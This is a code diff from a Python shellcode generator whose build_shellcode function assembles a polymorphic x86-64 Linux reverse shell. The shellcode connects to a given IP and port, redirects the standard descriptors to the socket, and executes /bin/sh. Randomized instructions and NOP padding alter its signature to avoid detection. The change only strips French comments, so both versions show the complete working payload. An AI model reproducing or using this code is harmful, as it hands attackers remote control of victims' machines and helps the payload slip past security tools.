@@ -202,63 +202,63 @@ def build_shellcode(ip, port):
 
     # Code assembleur pour le shellcode
     asm_code = f"""
-global _start  # Déclaration de l'étiquette _start comme point d'entrée global
+global _start  
 
-section .text  # Début de la section de texte contenant le code exécutable
+section .text  
 
-_start:  # Étiquette de début du programme
-    {randomize_instruction('xor rax, rax')}  # Initialiser le registre rax à zéro de manière polymorphe
-    {randomize_instruction('xor rbx, rbx')}  # Initialiser le registre rbx à zéro de manière polymorphe
-    {randomize_instruction('xor rcx, rcx')}  # Initialiser le registre rcx à zéro de manière polymorphe
-    {randomize_instruction('xor rdx, rdx')}  # Initialiser le registre rdx à zéro de manière polymorphe
-    {randomize_instruction('xor rdi, rdi')}  # Initialiser le registre rdi à zéro de manière polymorphe
-    {randomize_instruction('xor rsi, rsi')}  # Initialiser le registre rsi à zéro de manière polymorphe
-    {generate_no_operations(random.randint(1, 10))}  # Générer des instructions "nop" pour du padding aléatoire
-    mov al, 41  # Placer la valeur 41h dans le registre al (syscall pour socket)
-    mov dil, 2  # Placer la valeur 2 dans le registre dil (AF_INET)
-    mov sil, 1  # Placer la valeur 1 dans le registre sil (SOCK_STREAM)
-    mov dl, 6  # Placer la valeur 6 dans le registre dl (IPPROTO_TCP)
-    syscall  # Appeler le syscall (création de socket)
-    {generate_no_operations(random.randint(1, 10))}  # Générer des instructions "nop" pour du padding aléatoire
-    mov r8, rax  # Copier la valeur de rax (descripteur de socket) dans r8
-    sub rsp, 40  # Réserver 40 octets sur la pile
-    mov byte [rsp], 0x2  # Placer la valeur 2 (AF_INET) à l'adresse [rsp]
-    mov word [rsp+2], 0x{encoded_port}  # Placer le port encodé à l'adresse [rsp+2]
-    sub word [rsp+2], 0x0101  # Décrémenter le port encodé de 0x0101
-    mov dword [rsp+4], 0x{encoded_ip}  # Placer l'IP encodée à l'adresse [rsp+4]
-    sub dword [rsp+4], 0x01010101  # Décrémenter l'IP encodée de 0x01010101
-    mov rsi, rsp  # Copier l'adresse de la structure sockaddr_in dans rsi
-    mov dl, 16  # Placer la valeur 16 (taille de sockaddr_in) dans dl
-    push r8  # Sauvegarder le descripteur de socket sur la pile
-    pop rdi  # Restaurer le descripteur de socket dans rdi
-    mov al, 42  # Placer la valeur 42h dans al (syscall pour connect)
-    syscall  # Appeler le syscall (connexion)
-    {generate_no_operations(random.randint(1, 10))}  # Générer des instructions "nop" pour du padding aléatoire
-    {randomize_instruction('mov al, 33')}  # Instruction polymorphe pour mov al, 33
-    {randomize_instruction('push r8')}  # Instruction polymorphe pour push r8
-    {randomize_instruction('pop rdi')}  # Instruction polymorphe pour pop rdi
-    {randomize_instruction('xor rsi, rsi')}  # Instruction polymorphe pour xor rsi, rsi
-    {randomize_instruction('syscall')}  # Instruction polymorphe pour syscall
-    {generate_no_operations(random.randint(1, 10))}  # Générer des instructions "nop" pour du padding aléatoire
-    {randomize_instruction('mov al, 33')}  # Instruction polymorphe pour mov al, 33
-    {randomize_instruction('push r8')}  # Instruction polymorphe pour push r8
-    {randomize_instruction('pop rdi')}  # Instruction polymorphe pour pop rdi
-    {randomize_instruction('mov sil, 1')}  # Instruction polymorphe pour mov sil, 1
-    {randomize_instruction('syscall')}  # Instruction polymorphe pour syscall
-    {randomize_instruction('mov al, 33')}  # Instruction polymorphe pour mov al, 33
-    {randomize_instruction('push r8')}  # Instruction polymorphe pour push r8
-    {randomize_instruction('pop rdi')}  # Instruction polymorphe pour pop rdi
-    {randomize_instruction('mov sil, 2')}  # Instruction polymorphe pour mov sil, 2
-    {randomize_instruction('syscall')}  # Instruction polymorphe pour syscall
-    xor rsi, rsi  # Initialiser le registre rsi à zéro
-    push rsi  # Empiler rsi (qui est zéro) pour terminer les arguments de la commande
-    mov rdi, 0x68732f2f6e69622f  # Placer la chaîne "/bin//sh" dans rdi
-    push rdi  # Empiler rdi pour configurer le premier argument de execve
-    push rsp  # Empiler rsp pour configurer le pointeur vers la chaîne de commande
-    pop rdi  # Restaurer rsp dans rdi (premier argument de execve)
-    mov al, 59  # Placer la valeur 59h dans al (syscall pour execve)
-    cdq  # Zero extension de rdx
-    syscall  # Appeler le syscall (execve pour exécuter /bin/sh)
+_start:  
+    {randomize_instruction('xor rax, rax')}  
+    {randomize_instruction('xor rbx, rbx')}  
+    {randomize_instruction('xor rcx, rcx')}  
+    {randomize_instruction('xor rdx, rdx')}  
+    {randomize_instruction('xor rdi, rdi')}  
+    {randomize_instruction('xor rsi, rsi')}  
+    {generate_no_operations(random.randint(1, 10))}  
+    mov al, 41  
+    mov dil, 2  
+    mov sil, 1  
+    mov dl, 6  
+    syscall  
+    {generate_no_operations(random.randint(1, 10))}  
+    mov r8, rax  
+    sub rsp, 40  
+    mov byte [rsp], 0x2  
+    mov word [rsp+2], 0x{encoded_port}  
+    sub word [rsp+2], 0x0101  
+    mov dword [rsp+4], 0x{encoded_ip} 
+    sub dword [rsp+4], 0x01010101  
+    mov rsi, rsp  
+    mov dl, 16  
+    push r8  
+    pop rdi 
+    mov al, 42  
+    syscall 
+    {generate_no_operations(random.randint(1, 10))}  
+    {randomize_instruction('mov al, 33')}  
+    {randomize_instruction('push r8')}  
+    {randomize_instruction('pop rdi')}  
+    {randomize_instruction('xor rsi, rsi')}  
+    {randomize_instruction('syscall')}  
+    {generate_no_operations(random.randint(1, 10))}  
+    {randomize_instruction('mov al, 33')}  
+    {randomize_instruction('push r8')} 
+    {randomize_instruction('pop rdi')}  
+    {randomize_instruction('mov sil, 1')}  
+    {randomize_instruction('syscall')} 
+    {randomize_instruction('mov al, 33')}  
+    {randomize_instruction('push r8')}  
+    {randomize_instruction('pop rdi')} 
+    {randomize_instruction('mov sil, 2')} 
+    {randomize_instruction('syscall')} 
+    xor rsi, rsi  
+    push rsi  
+    mov rdi, 0x68732f2f6e69622f  
+    push rdi 
+    push rsp  
+    pop rdi 
+    mov al, 59 
+    cdq  
+    syscall  
     """
 
     shellcode = compile_shellcode(asm_code) # Compiler le shellcode
